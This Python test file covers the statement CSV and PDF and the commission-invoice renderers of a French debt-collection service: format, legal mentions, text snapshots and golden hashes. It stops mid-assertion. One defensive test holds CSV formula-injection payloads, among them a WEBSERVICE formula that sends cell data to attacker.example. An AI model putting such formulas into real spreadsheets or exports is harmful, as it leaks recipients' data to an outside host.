"""The statement and the commission invoices as documents (M2c-5; design §10, §14.2, §18 M2-14 and
M2-15; risk R9): the French wording from the payload (text snapshots), the mentions the law
requires on an invoice and a credit note (CGI ann. II 242 nonies A, C. com. L441-9, L441-10,
D441-5, R123-237/238), the CSV's format (BOM, `;`, CRLF, fixed headers, both amount forms), and
deterministic bytes pinned by golden SHA-256 for fixed synthetic payloads
(`tests/document_cases.py`) — whatever reportlab settings the environment holds.
"""

from __future__ import annotations

import csv
import hashlib
import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
from document_cases import (
    CREDIT_REFS,
    ISSUE,
    SINCE,
    SUIVI_EVENTS,
    cancelled_statement_payload,
    credit_note_payload,
    due_invoice_payload,
    hostile_statement_payload,
    invoice_payload,
    partial_invoice_payload,
    partial_statement_payload,
    proceeding_invoice_payload,
    statement_payload,
    suivi_statement_payload,
    zero_net_invoice_payload,
    zero_net_statement_payload,
)
from hypothesis import given
from hypothesis import strategies as st

from collectoo_worker.remittance.invoice import (
    TEMPLATE_V2 as INVOICE_TEMPLATE_V2,
)
from collectoo_worker.remittance.invoice import (
    TEMPLATE_VERSION as INVOICE_TEMPLATE,
)
from collectoo_worker.remittance.invoice import (
    InvoiceDocument,
    invoice_text,
    invoice_view,
    mention_list,
)
from collectoo_worker.remittance.invoice_pdf import render_invoice_pdf
from collectoo_worker.remittance.pdf import RENDERER_VERSION
from collectoo_worker.remittance.statement import (
    CSV_HEADER,
    PDF_FILE_ROWS_MAX,
    TEMPLATE_V3,
    TEMPLATE_VERSIONS,
    StatementPayloadError,
    line_records,
    nature,
    statement_text,
    statement_view,
    template_of,
)
from collectoo_worker.remittance.statement_csv import (
    TEXT_COLUMNS,
    csv_amount,
    neutralise,
    render_statement_csv,
)
from collectoo_worker.remittance.statement_pdf import render_statement_pdf

GOLDEN_RENDERER = "reportlab-4.4.10/dejavu-2.37/d1"
# M2c-5 review, templates fr-2: the statement CSV moved for one reason only — the late line's
# « hors_delai » is its cause (« oui, validation tardive »), not the approver's text (legal#6);
# the formula neutralisation leaves the fixture's bytes alone (checked below). The statement PDF
# moved with it and with section 6 « Au … » (figures#2) and the template name; the invoice PDFs
# with the template name, the buyer's registered office beside its billing address (legal#1) and,
# for the netted one, the amount the run sets off (legal#4).
GOLDEN_STATEMENT_CSV = "38d598d577aada2c4c867cc7973cb1f0882d9db585013155cfde491cceb31ffe"
# M2c-6b-2d, template fr-3 (plan §5): « Suivi » words the events of the earlier runs as of K, so
# the statement PDF moved (its section 5 and the template name); the CSV keeps its bytes (its
# columns and lines are unchanged: the two new line columns are not written). A second golden pins
# one sentence of each « Suivi » event (review round 1: and the later executions, one ranked
# before the planned debit).
GOLDEN_STATEMENT_PDF = "5944ed12d4167f744981928975e1bdd6339fed436a157ac7fec4a0738ca9bbc0"
GOLDEN_SUIVI_PDF = "9d324ad11e73c48d481e5c338b0b07ef2fe35cd7e8f2d1b717c718162eed4d7c"
GOLDEN_INVOICE_PDF = "761e0660114a9be9c5493c9451202da80c073f81eb4391952462af68fb523971"
GOLDEN_DUE_PDF = "3a30df814d203fe06b4ff76b6bd19d36ddb600527187047679595be07c0a05f6"
GOLDEN_CREDIT_PDF = "90ec403c678cd214db38d282f30250fa2a93b3fcf2369cc1c5ee64fc2630ed39"
GOLDEN_PROCEEDING_PDF = "73161dc76f51dd97fbf8b89fd5621f941d732814619423e8436494efb4e7bc83"
# M2c-5b review legal#1, template fr-3: a credit note states each rectified invoice's HT and VAT
# after it; the documents drawn before keep fr-2 and their bytes (the hashes above, rendered fr-2)
GOLDEN_INVOICE_PDF_FR3 = "cb4a86772af528bcbb4c3119d725311475efc880b1fe0e9d569a3c80717d89b5"
GOLDEN_DUE_PDF_FR3 = "858f7d94f50f16461b5441c9810df018b619f694d9285a46ac4159465c7db784"
GOLDEN_CREDIT_PDF_FR3 = "dbccde6504fce451d210c9eb81cb0663f001c3b1506e54119a752d620df596e2"
GOLDEN_PROCEEDING_PDF_FR3 = "b16181954e27134959625d56048455628805621cfdfd79e2499cf6676b23f0ae"
GOLDEN_HOSTILE_CSV = "722a4fcc0ce509606b63795a3b722050a560ebbdcba75fe9f2f3a1adf3392b8c"


def _sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def _doc(
    payload: dict[str, object],
    refs: dict[str, dict[str, str]] | None = None,
    template: str = INVOICE_TEMPLATE,
) -> InvoiceDocument:
    return InvoiceDocument(
        str(payload["number"]), str(payload["kind"]), ISSUE, payload, refs or {}, template
    )


# -- the CSV --------------------------------------------------------------------------------------


def test_csv_amounts_are_french_with_grouping_and_in_cents() -> None:
    assert csv_amount(123_456_789, 2) == "1\u00a0234\u00a0567,89"
    assert csv_amount(-1, 2) == "-0,01"
    assert csv_amount(0, 2) == "0,00"
    assert csv_amount(5, 0) == "5"


@given(st.integers(min_value=-(10**15), max_value=10**15))
def test_csv_amounts_keep_every_minor_unit(minor: int) -> None:
    text = csv_amount(minor, 2).replace("\u00a0", "").replace(",", "")
    assert int(text) == minor


def test_the_csv_format() -> None:
    data = render_statement_csv(statement_payload())
    assert data.startswith(b"\xef\xbb\xbf")
    body = data.decode("utf-8-sig")
    assert body.count("\r\n") == body.count("\n") == 1 + 6  # header + 5 lines + 1 repricing
    rows = list(csv.reader(io.StringIO(body, newline=""), delimiter=";"))
    assert tuple(rows[0]) == CSV_HEADER
    assert CSV_HEADER[:21] == (
        "releve", "date_releve", "mandat", "portefeuille", "dossier", "debiteur", "piece",
        "composante", "nature", "date_encaissement", "date_imputation",
        "date_limite_reversement", "montant", "montant_centimes", "regle", "taux",
        "base_commission_centimes", "commission_ht", "commission_ht_centimes", "facture",
        "quittance",
    )  # fmt: skip
    first = dict(zip(CSV_HEADER, rows[1], strict=True))
    assert first["piece"] == "Facture F-001 ; Facture F-002"  # quoted: it holds the separator
    assert first["composante"] == "Principal ; Intérêts"
    assert (first["montant"], first["montant_centimes"]) == ("2\u00a0000,00", "200000")
    assert first["date_encaissement"] == "2026-10-21" and first["date_releve"] == "2026-11-02"


def test_csv_equals_the_payload_totals() -> None:
    """CSV = PDF = run: the rows add up to the gross and to the commission the payload states."""
    p = statement_payload()
    rows = list(
        csv.reader(
            io.StringIO(render_statement_csv(p).decode("utf-8-sig"), newline=""), delimiter=";"
        )
    )[1:]
    t = p["totals"]
    assert sum(int(r[13]) for r in rows) == int(t["gross_minor"])
    assert sum(int(r[18]) for r in rows) == int(t["commission_ht_minor"])
    assert sum(1 for r in rows if not r[8].startswith("Commission sur")) == t["line_count"]
    # the per-file table of the PDF and the natures add up to the same
    assert sum(int(f["amount_minor"]) for f in p["files"]) == int(t["gross_minor"])
    assert sum(int(f["commission_minor"]) for f in p["files"]) == int(t["commission_ht_minor"])
    assert sum(int(n["amount_minor"]) for n in p["natures"]) == int(t["gross_minor"])


def test_the_natures_and_late_lines_are_worded() -> None:
    lines = line_records(statement_payload())
    assert [x.nature for x in lines] == [
        "Paiement imputé",
        "Paiement imputé",
        "Paiement repris par la banque du payeur",
        "Reversement sans imputation (dossier rappelé)",
        "Paiement imputé",
        "Commission sur un encaissement du relevé RV-2026-000001",
    ]
    assert lines[1].late == "oui \u2013 validation tardive"  # a cause, never a free text
    assert lines[4].rules == "Commission en attente" and lines[4].commission_minor == 0
    assert lines[0].rates == "15\u00a0%"


def test_a_field_holding_a_quote_or_a_line_break_is_quoted() -> None:
    p = statement_payload()
    p["lines"][0][4] = 'Durand "le jeune";\nSARL'
    body = render_statement_csv(p).decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(body, newline=""), delimiter=";"))
    assert rows[1][5] == 'Durand "le jeune";\nSARL' and len(rows) == 7


# -- the statement's summary ----------------------------------------------------------------------

STATEMENT_SNAPSHOT_START = """Relevé de reversement
N° RV-2026-000002
Établi le 02/11/2026
Encaissements connus au 02/11/2026 à 05:47

Collectoo SAS au capital de 10\u202f000\u00a0€
SIREN 732\u202f829\u202f320 · RCS Paris
Siège social : 10 rue de la Bourse, 75002 Paris
N° de TVA intracommunautaire : FR44732829320
agissant en qualité de mandataire de recouvrement amiable

Mandant : Martin SAS
SIREN 552\u202f100\u202f554
3 quai Perrache, Bât. B, 69002 Lyon
Mandat MAND-MARTIN-2026 du 15/01/2026 (rémunération : art. 6 ; reversements : art. 7 ; \
compensation : art. 7.2 ; reprise des avances : art. 7.4)
Période : du 21/10/2026 au 02/11/2026 · devise : EUR

Récapitulatif
Sommes encaissées pour votre compte : 2\u202f633,45\u00a0€
Encaissements annulés ou repris : -200,00\u00a0€
Montant brut à reverser : 2\u202f433,45\u00a0€
Factures de commission (TTC) : 464,40\u00a0€
Avoirs (TTC) : -36,00\u00a0€
Commission à régler par compensation : -568,40\u00a0€
Montant net du reversement : 1\u202f865,05\u00a0€
"""


def test_the_statement_text_snapshot() -> None:
    p = statement_payload()
    text = statement_text(p, GOLDEN_STATEMENT_CSV)
    assert text.startswith(STATEMENT_SNAPSHOT_START)
    for expected in (
        "Paiement repris par la banque du payeur (1) : -200,00\u00a0€",
        "L-003 | Société Nouvelle d'Équipement | 2 | 133,45\u00a0€ | 0,00\u00a0€",
        f"figure dans le fichier CSV joint (SHA-256 {GOLDEN_STATEMENT_CSV}).",
        "Facture FC-2026-000003 du 02/11/2026 (mandat MAND-MARTIN-2026) : HT 387,00\u00a0€, TVA "
        "20\u00a0% 77,40\u00a0€, TTC 464,40\u00a0€. À régler par compensation sur le présent "
        "reversement (art. 7.2 du mandat) : 464,40\u00a0€.",
        "Rectifie la facture FC-2026-000001 du 20/10/2026.",
        "Virement de 1\u202f865,05\u00a0€ ordonné le 02/11/2026 vers FR76 •••• •••• •••• 1234 "
        "(titulaire MARTIN SAS), exécution demandée le 03/11/2026, référence RMT0A1B2C3D4E5F.",
        "Reversement RV-2026-000001 : virement de 1\u202f000,00\u00a0€ (référence RMT0Z9Y8X7W6V5U) "
        "débité de notre compte dédié le 21/10/2026.",
        "Dossier L-002 : 150,00\u00a0€ reçus et en attente — paiement bloqué (procédure en cours) "
        "(du 12/10/2026 au 19/10/2026).",
        "Dossier L-009 : 80,00\u00a0€ restitués au payeur — trop-perçu (le 21/10/2026).",
        "Sommes vous revenant au 02/11/2026 : 2\u202f433,45\u00a0€",
        "Factures de commission restant dues au 02/11/2026 : 140,00\u00a0€",
    ):
        assert expected in text, expected


def test_nothing_says_paid_before_the_banks_debit() -> None:
    """« ordonné », « à régler par compensation »: never « payé » or « réglé » (M2c-6 books the
    debit), whatever the run's state."""
    p = statement_payload()
    variants = [p]
    zero = statement_payload()
    zero["payout"] = None
    zero["totals"]["net_minor"] = "0"
    variants.append(zero)
    cancelled = statement_payload()
    cancelled["status"], cancelled["cancelled_on"] = "cancelled", "2026-11-02"
    variants.append(cancelled)
    # M2c-6b-2d: every « Suivi » event, here or not, with or without an advance
    variants.append(suivi_statement_payload())
    elsewhere = suivi_statement_payload()
    for e in elsewhere["previous_payouts"]["events"]:
        if "here" in e:
            e["here"] = False
    variants.append(elsewhere)
    for v in variants:
        text = statement_text(v, GOLDEN_STATEMENT_CSV).lower()
        assert " payé" not in text and " réglé" not in text and "payée" not in text
    assert "aucun virement : le montant net est nul" in statement_text(zero, "0" * 64).lower()
    assert "annulé le 02/11/2026 avant l'exécution" in statement_text(cancelled, "0" * 64)


def test_above_two_thousand_files_the_pdf_names_the_csv() -> None:
    p = statement_payload()
    p["files"] = [
        {
            "file": f"L-{i:05d}",
            "debtor": "D",
            "lines": "1",
            "amount_minor": "1",
            "commission_minor": "0",
            "late": "0",
        }
        for i in range(PDF_FILE_ROWS_MAX + 1)
    ]
    text = statement_text(p, "a" * 64)
    assert (
        f"{PDF_FILE_ROWS_MAX + 1} dossiers : détail complet dans le fichier CSV joint "
        f"(SHA-256 {'a' * 64})." in text
    )
    assert "Dossier | Débiteur" not in text


# -- the invoices: mentions ----------------------------------------------------------------------


def test_the_invoice_mentions() -> None:
    """CGI ann. II 242 nonies A 1°, 2°, 6° to 11°; R123-237/238; L441-9; L441-10 II; D441-5."""
    text = invoice_text(_doc(invoice_payload()))
    for mention, basis in (
        ("Facture\nN° FC-2026-000003\nDate d'émission : 02/11/2026", "242 nonies A 6°, 7°"),
        ("Collectoo SAS au capital de 10\u202f000\u00a0€", "242 nonies A 1°; R123-238"),
        ("SIREN 732\u202f829\u202f320 · RCS Paris", "242 nonies A 1°; R123-237 1°, 2°"),
        ("Siège social : 10 rue de la Bourse, 75002 Paris", "242 nonies A 1°; R123-237 3°"),
        ("N° de TVA intracommunautaire : FR44732829320", "242 nonies A 2°"),
        (
            "Client : Martin SAS\nSIREN 552\u202f100\u202f554\nSiège social : 3 quai Perrache, "
            "69002 Lyon\nAdresse de facturation : 3 quai Perrache, Bât. B, 69002 Lyon",
            "242 nonies A 1°; L441-9 I (their address and their billing address if different)",
        ),
        ("Prestations de services", "242 nonies A 8° bis"),
        (
            "Recouvrement amiable de créances pour votre compte — encaissements du 21/10/2026 au "
            "02/11/2026",
            "242 nonies A 10°",
        ),
        ("| 1 | 375,00\u00a0€ | 20\u00a0% | 375,00\u00a0€", "242 nonies A 8°"),
        ("Aucun rabais, remise ni ristourne.", "242 nonies A 9°"),
        (
            "Total HT : 387,00\u00a0€\nTVA 20\u00a0% sur 387,00\u00a0€ : 77,40\u00a0€\n"
            "Total TTC : 464,40\u00a0€",
            "242 nonies A 11°",
        ),
        (
            "À régler par compensation sur le reversement RV-2026-000002 : 464,40\u00a0€ "
            "(exécution demandée le 03/11/2026 ; mandat MAND-MARTIN-2026, art. 7.2).",
            "L441-9 I",
        ),
        ("Pas d'escompte pour paiement anticipé.", "L441-9 I"),
        (
            "Pénalités de retard : taux d'intérêt appliqué par la Banque centrale européenne",
            "L441-10 II",
        ),
        (
            "Indemnité forfaitaire pour frais de recouvrement en cas de retard de paiement : "
            "40,00\u00a0€.",
            "L441-10 II; D441-5",
        ),
    ):
        assert mention in text, basis
    assert "Option pour le paiement de la taxe d'après les débits" not in text
    assert "CGI" not in text and "article" not in text.lower()  # no article number (design §3.1)


def test_the_mentions_frozen_at_issue_are_the_payloads() -> None:
    """The penalty text, the indemnity, the own account and the date come from the payload (M2c-4
    froze them before hashing), never from the current settings."""
    due = invoice_text(_doc(due_invoice_payload()))
    assert (
        "À régler au plus tard le 02/12/2026 par virement sur le compte FR76 3000 6000 0112 3456 "
        "7890 189 (BIC AGRIFRPPXXX), titulaire Collectoo."
    ) in due
    settings = invoice_payload(
        penalty_text="Pénalités : 3 fois le taux d'intérêt légal.",
        vat_on_debits=True,
    )
    text = invoice_text(_doc(settings))
    assert "Pénalités : 3 fois le taux d'intérêt légal." in text
    assert "Option pour le paiement de la taxe d'après les débits." in text
    nxt = invoice_payload(
        reason="run_cancelled",
        payment_reference={"mode": "next_run", "latest_date": "2026-12-02"},
        due_date="2026-12-02",
    )
    assert (
        "À régler par compensation sur le prochain reversement de vos encaissements, au plus "
        "tard le 02/12/2026 (mandat MAND-MARTIN-2026, art. 7.2)."
    ) in invoice_text(_doc(nxt))
    po = invoice_text(_doc(invoice_payload(po_number="BC-77")))
    assert "Votre bon de commande n° BC-77" in po


def test_the_credit_note_names_the_invoice_it_rectifies() -> None:
    """CGI 289 I 5, 272 1: each line and the mention name the rectified invoice."""
    text = invoice_text(_doc(credit_note_payload(), CREDIT_REFS))
    assert text.startswith("Avoir\nN° FC-2026-000004\n")
    assert (
        "Avoir n° FC-2026-000004 rectifiant la facture FC-2026-000001 du 20/10/2026 : HT "
        "-30,00\u00a0€, TVA -6,00\u00a0€."
    ) in text
    assert (
        "Avoir rectifiant la facture FC-2026-000001 du 20/10/2026 — encaissements annulés" in text
    )
    assert "TVA 20\u00a0% sur -30,00\u00a0€ : -6,00\u00a0€" in text
    assert "Aucun rabais" not in text and "Indemnité" not in text and "escompte" not in text


def test_a_credit_note_states_each_invoice_after_it() -> None:
    """Review legal#1: « le montant du total hors taxes et de la TVA due après application de la
    réduction de prix » (BOI-TVA-DECLA-30-20-20-20 §260, BOI-TVA-DED-40-10-20 §80), per invoice
    it rectifies, from the payload (`ht_after`, `vat_after`, frozen at issue); the excess owed to
    the client never reads as paid. The mentions of the credit note, in full (fr-3); fr-2 renders
    what it rendered."""
    assert mention_list(_doc(credit_note_payload(), CREDIT_REFS)) == (
        "Avoir n° FC-2026-000004 rectifiant la facture FC-2026-000001 du 20/10/2026 : HT "
        "-30,00\u00a0€, TVA -6,00\u00a0€.",
        "Après cet avoir, la facture FC-2026-000001 du 20/10/2026 s'élève à 70,00\u00a0€ HT, TVA "
        "14,00\u00a0€ (20\u00a0%).",
        "Le montant de cet avoir est déduit des factures qu'il rectifie ; l'excédent éventuel vous "
        "est dû : il vous sera versé avec un prochain reversement, ou par virement s'il n'y en a "
        "pas.",
    )
    assert mention_list(_doc(credit_note_payload(), CREDIT_REFS, INVOICE_TEMPLATE_V2)) == (
        "Avoir n° FC-2026-000004 rectifiant la facture FC-2026-000001 du 20/10/2026 : HT "
        "-30,00\u00a0€, TVA -6,00\u00a0€.",
        "Le montant de cet avoir est déduit des factures qu'il rectifie ; l'excédent éventuel vous "
        "est remboursé avec un prochain reversement.",
    )
    old = credit_note_payload()  # a payload frozen before fr-3: nothing invented
    for c in old["corrections"]:
        del c["ht_after"], c["vat_after"]
    assert not any("Après cet avoir" in m for m in mention_list(_doc(old, CREDIT_REFS)))


def test_a_credit_note_on_invoices_of_two_rates_states_each() -> None:
    p = credit_note_payload()
    p["corrections"].append(
        {
            "original_invoice_id": "c0000000-0000-0000-0000-000000000002",
            "vat_rate": "0.1000",
            "ht": "-1000",
            "vat": "-100",
        }
    )
    totals = dict(invoice_view(_doc(p, CREDIT_REFS)).totals)
    assert totals["TVA 20\u00a0% sur -30,00\u00a0€"] == "-6,00\u00a0€"
    assert totals["TVA 10\u00a0% sur -10,00\u00a0€"] == "-1,00\u00a0€"


def test_an_unknown_template_is_refused() -> None:
    doc = InvoiceDocument("FC-1", "invoice", ISSUE, invoice_payload(), {}, "facture-xx")
    with pytest.raises(ValueError, match="unknown invoice template"):
        invoice_view(doc)


# -- deterministic bytes --------------------------------------------------------------------------


def test_the_golden_hashes() -> None:
    assert RENDERER_VERSION == GOLDEN_RENDERER
    # (M2c-7d-3, house rule R3) the current template is fr-4 for payloads of schema 2; this
    # fixture is of schema 1 and keeps fr-3 and every one of its bytes (the hashes below
    # unchanged) — stored statements are never re-rendered
    assert (TEMPLATE_V3, INVOICE_TEMPLATE) == (
        "releve-reversement-fr-3",
        "facture-commission-fr-3",
    )
    assert TEMPLATE_VERSIONS == ("releve-reversement-fr-3", "releve-reversement-fr-4")
    assert template_of(statement_payload()) == TEMPLATE_V3
    p = statement_payload()
    data = render_statement_csv(p)
    assert _sha(data) == GOLDEN_STATEMENT_CSV
    pdf = render_statement_pdf(p, _sha(data))
    assert pdf == render_statement_pdf(p, _sha(data))
    assert _sha(pdf) == GOLDEN_STATEMENT_PDF
    suivi = suivi_statement_payload()
    assert _sha(render_statement_csv(suivi)) == GOLDEN_STATEMENT_CSV  # « Suivi » is not in the CSV
    assert _sha(render_statement_pdf(suivi, GOLDEN_STATEMENT_CSV)) == GOLDEN_SUIVI_PDF
    for template, hashes in (
        (
            INVOICE_TEMPLATE_V2,
            (GOLDEN_INVOICE_PDF, GOLDEN_DUE_PDF, GOLDEN_CREDIT_PDF, GOLDEN_PROCEEDING_PDF),
        ),
        (
            INVOICE_TEMPLATE,
            (
                GOLDEN_INVOICE_PDF_FR3,
                GOLDEN_DUE_PDF_FR3,
                GOLDEN_CREDIT_PDF_FR3,
                GOLDEN_PROCEEDING_PDF_FR3,
            ),
        ),
    ):
        got = tuple(
            _sha(render_invoice_pdf(_doc(payload, refs, template)))
            for payload, refs in (
                (invoice_payload(), None),
                (due_invoice_payload(), None),
                (credit_note_payload(), CREDIT_REFS),
                (proceeding_invoice_payload(), None),
            )
        )
        assert got == hashes, template
    assert _sha(render_statement_csv(hostile_statement_payload())) == GOLDEN_HOSTILE_CSV


def test_the_pdf_depends_on_the_payload_only() -> None:
    p = statement_payload()
    a = render_statement_pdf(p, "a" * 64)
    assert render_statement_pdf(p, "b" * 64) != a  # it names the CSV
    q = statement_payload()
    q["totals"]["net_minor"] = "186506"
    assert render_statement_pdf(q, "a" * 64) != a


def test_reportlab_settings_of_the_environment_do_not_change_the_bytes(tmp_path: Path) -> None:
    payload = tmp_path / "p.json"
    payload.write_text(json.dumps(statement_payload()))
    script = (
        "import hashlib, json, sys; from collectoo_worker.remittance.statement_csv import "
        "render_statement_csv; from collectoo_worker.remittance.statement_pdf import "
        "render_statement_pdf; p = json.load(open(sys.argv[1])); c = render_statement_csv(p); "
        "h = hashlib.sha256(c).hexdigest(); print(h, hashlib.sha256(render_statement_pdf(p, h))"
        ".hexdigest())"
    )
    (tmp_path / "reportlab_settings.py").write_text("invariant = 0\nttfAsciiReadable = 0\n")
    for env in (
        {"RL_invariant": "0", "RL_ttfAsciiReadable": "0", "TZ": "Pacific/Auckland"},
        {"PYTHONPATH": str(tmp_path), "SOURCE_DATE_EPOCH": "1"},
    ):
        out = subprocess.run(  # noqa: S603 - our own interpreter and code
            [sys.executable, "-c", script, str(payload)],
            capture_output=True,
            text=True,
            check=False,
            env={k: v for k, v in os.environ.items() if not k.startswith("RL_")} | env,
            cwd=tmp_path,
        )
        assert out.returncode == 0, out.stderr
        assert out.stdout.split() == [GOLDEN_STATEMENT_CSV, GOLDEN_STATEMENT_PDF], env


def test_a_long_statement_runs_over_pages() -> None:
    p = statement_payload()
    p["files"] = [
        {
            "file": f"L-{i:05d}",
            "debtor": "Débiteur au nom assez long pour passer à la ligne SARL",
            "lines": "1",
            "amount_minor": str(123_456_789 + i),
            "commission_minor": "0",
            "late": "0",
        }
        for i in range(300)
    ]
    pdf = render_statement_pdf(p, "a" * 64)
    assert pdf.count(b"/Type /Page\n") >= 6 or pdf.count(b"/Type /Page") >= 6


# -- review fixes (M2c-5 review) -----------------------------------------------------------------


def _csv_rows(payload: dict[str, object]) -> list[dict[str, str]]:
    body = render_statement_csv(payload).decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(body, newline=""), delimiter=";"))
    return [dict(zip(CSV_HEADER, r, strict=True)) for r in rows[1:]]


def test_a_text_cell_a_spreadsheet_would_evaluate_is_neutralised() -> None:
    """security#0: = + - @ TAB CR at the start of a text cell get an apostrophe; amounts, cents,
    rates and dates are never altered (a negative amount stays numeric)."""
    first, second, third, *_ = _csv_rows(hostile_statement_payload())
    assert first["debiteur"] == '\'=WEBSERVICE("https://attacker.example/?"&B2)'
    assert first["dossier"] == "'@SUM(1+1)"
    assert first["mandat"] == "'+1+cmd" and first["portefeuille"] == "'-2+3"
    assert second["debiteur"] == "'\tTAB SARL" and second["dossier"] == "'\rCR-1"
    assert (third["montant"], third["montant_centimes"]) == ("-200,00", "-20000")
    assert (third["commission_ht"], third["commission_ht_centimes"]) == ("-30,00", "-3000")
    assert neutralise("Durand SARL") == "Durand SARL" and neutralise("") == ""
    assert set(CSV_HEADER) >= TEXT_COLUMNS
    numeric = {"montant", "montant_centimes", "commission_ht", "commission_ht_centimes", "taux"}
    assert not TEXT_COLUMNS & (numeric | {c for c in CSV_HEADER if c.startswith("date")})
    # the fixture's own text has no such character: its golden CSV is unchanged by the rule
    assert render_statement_csv(statement_payload()) == render_statement_csv(statement_payload())


def test_a_late_line_states_its_cause_never_a_free_text() -> None:
    """legal#6: the CSV's hors_delai is « oui \u2013 <cause> » from the payload's code; an unknown
    code, or none, prints « oui » alone."""
    from document_cases import COLUMNS  # noqa: PLC0415

    p = statement_payload()
    at = COLUMNS.index("late_cause")
    words = []
    codes = ("payout_returned", "unmeetable", "identified_late", "approved_late")
    for code in (*codes, "an approver's text", None):
        p["lines"][1][at] = code
        words.append(_csv_rows(p)[1]["hors_delai"])
    assert words == [
        "oui \u2013 virement revenu impayé, reversé à nouveau",
        "oui \u2013 délai contractuel intenable (art. R124-6 : un mois)",
        "oui \u2013 encaissement identifié tardivement",
        "oui \u2013 validation tardive",
        "oui",
        "oui",
    ]
    assert "leur cause figurent dans le fichier CSV" in statement_text(p, "0" * 64)


def test_a_returned_payout_paid_again_late_states_the_return_as_its_cause() -> None:
    """M2c-6b-1 review round 2 (L1, new:statement-late-cause): the line of a returned payout paid
    again keeps the date of the line it came from (K2); late, its CSV cause is the return
    (« virement revenu impayé, reversé à nouveau »), never a collection's; the PDF counts it among
    the late lines and names the CSV for their cause; the PDF renders."""
    from document_cases import COLUMNS  # noqa: PLC0415

    p = statement_payload()
    line = list(p["lines"][1])
    for column, value in (
        ("nature", "payout_returned"),
        ("file", None),
        ("debtor", None),
        ("items", []),
        ("components", []),
        ("rules", []),
        ("rates", []),
        ("basis_minor", "0"),
        ("commission_minor", "0"),
        ("commission_state", "none"),
        ("invoice", None),
        ("receipt", None),
        ("late", True),
        ("late_cause", "payout_returned"),
    ):
        line[COLUMNS.index(column)] = value
    p["lines"][1] = line
    row = _csv_rows(p)[1]
    assert row["nature"] == "Virement revenu impayé \u2014 reversé à nouveau"
    assert row["hors_delai"] == "oui \u2013 virement revenu impayé, reversé à nouveau"
    text = statement_text(p, "0" * 64)
    late = "1 encaissement(s) reversé(s) hors délai : le détail et leur cause figurent dans le"
    assert late in text
    for collection_cause in ("identifié tardivement", "validation tardive"):
        assert collection_cause not in text
        assert collection_cause not in row["hors_delai"]
    pdf = render_statement_pdf(p, "0" * 64)
    assert pdf.startswith(b"%PDF") and render_statement_pdf(p, "0" * 64) == pdf


def test_an_unplanned_payout_s_return_is_never_said_paid_again() -> None:
    """M2c-6b-2b review LT-2 (plan §5, critic L4, brought forward): the item an unplanned payout's
    return re-owes (nature_reason `unplanned` on a payout_returned line, pgTAP 037 G) is « Virement
    exécuté hors reversement revenu » in the CSV and the PDF's nature total; late, its cause is the
    unplanned payout come back — never « reversé à nouveau »; a planned return keeps its words."""
    from document_cases import COLUMNS  # noqa: PLC0415

    p = statement_payload()
    line = list(p["lines"][1])
    for column, value in (
        ("nature", "payout_returned"),
        ("nature_reason", "unplanned"),
        ("file", None),
        ("debtor", None),
        ("items", []),
        ("components", []),
        ("rules", []),
        ("rates", []),
        ("basis_minor", "0"),
        ("commission_minor", "0"),
        ("commission_state", "none"),
        ("invoice", None),
        ("receipt", None),
        ("late", True),
        ("late_cause", "unplanned_payout_returned"),
    ):
        line[COLUMNS.index(column)] = value
    p["lines"][1] = line
    p["natures"] = [
        *p["natures"],
        {
            "kind": "payout_returned",
            "reason": "unplanned",
            "count": "1",
            "amount_minor": line[COLUMNS.index("amount_minor")],
            "commission_minor": "0",
        },
    ]
    row = _csv_rows(p)[1]
    assert row["nature"] == "Virement exécuté hors reversement revenu"
    assert row["hors_delai"] == "oui \u2013 virement exécuté hors reversement revenu impayé"
    text = statement_text(p, "0" * 64)
    assert "Virement exécuté hors reversement revenu (1)" in text
    assert "reversé à nouveau" not in text and "reversé à nouveau" not in json.dumps(row)
    assert nature("payout_returned", None, None) == "Virement revenu impayé — reversé à nouveau"
    pdf = render_statement_pdf(p, "0" * 64)
    assert pdf.startswith(b"%PDF")


def test_the_indemnity_is_stated_to_every_professional_buyer() -> None:
    """legal#0 (L441-9 I, L441-10 II, D441-5): a proceeding does not remove the mention — the
    new payload freezes it apart for the dunning step; a payload M2c-4 froze as not applying
    still prints it to a professional buyer; a buyer that is not a professional gets none."""
    mention = (
        "Indemnité forfaitaire pour frais de recouvrement en cas de retard de paiement : "
        "40,00\u00a0€."
    )
    assert mention in invoice_text(_doc(proceeding_invoice_payload()))
    frozen_off = invoice_payload(flat_indemnity={"applies": False, "amount_minor": None})
    assert mention in invoice_text(_doc(frozen_off))
    private = invoice_payload(flat_indemnity={"applies": False, "amount_minor": None})
    private["buyer"]["is_professional"] = False
    assert "Indemnité forfaitaire" not in invoice_text(_doc(private))


def test_the_buyers_address_and_its_billing_address_when_different() -> None:
    """legal#1 (L441-9 I): « leur adresse et leur adresse de facturation si elle est
    différente » — the registered office always, the billing address only when it differs."""
    text = invoice_text(_doc(invoice_payload()))
    assert "Siège social : 3 quai Perrache, 69002 Lyon" in text
    assert "Adresse de facturation : 3 quai Perrache, Bât. B, 69002 Lyon" in text
    same = invoice_payload()
    same["buyer"]["billing_address"] = dict(same["buyer"]["registered_office"])
    text = invoice_text(_doc(same))
    assert "Siège social : 3 quai Perrache, 69002 Lyon" in text
    assert "Adresse de facturation" not in text
    assert text.count("Siège social") == 2  # the seller's and the buyer's
    seller = invoice_payload()
    seller["seller"]["billing_address"] = {
        "line1": "BP 12",
        "postcode": "75001",
        "city": "Paris",
        "country": "FR",
    }
    assert "Adresse de facturation : BP 12, 75001 Paris" in invoice_text(_doc(seller))


def test_the_invoice_and_the_statement_state_the_same_set_off() -> None:
    """legal#4, figures#4: the plan sets off 200,00 € of FC-2026-000003 on this run; both texts
    state it and the remainder's latest date."""
    inv = invoice_text(_doc(partial_invoice_payload()))
    assert (
        "À régler par compensation sur le reversement RV-2026-000002 : 200,00\u00a0€ (exécution "
        "demandée le 03/11/2026 ; mandat MAND-MARTIN-2026, art. 7.2). Le solde de 264,40\u00a0€ : "
        "à régler par compensation sur le prochain reversement de vos encaissements, au plus "
        "tard le 02/12/2026."
    ) in inv
    st = statement_text(partial_statement_payload(), "0" * 64)
    assert (
        "À régler par compensation sur le présent reversement (art. 7.2 du mandat) : "
        "200,00\u00a0€. Solde de 264,40\u00a0€ : à régler par compensation sur le prochain "
        "reversement, au plus tard le 02/12/2026."
    ) in st
    nothing = invoice_payload(
        due_date="2026-12-02",
        payment_reference={
            "mode": "next_run",
            "latest_date": "2026-12-02",
            "amount_minor": "46440",
        },
    )
    assert "sur le prochain reversement de vos encaissements, au plus tard le 02/12/2026" in (
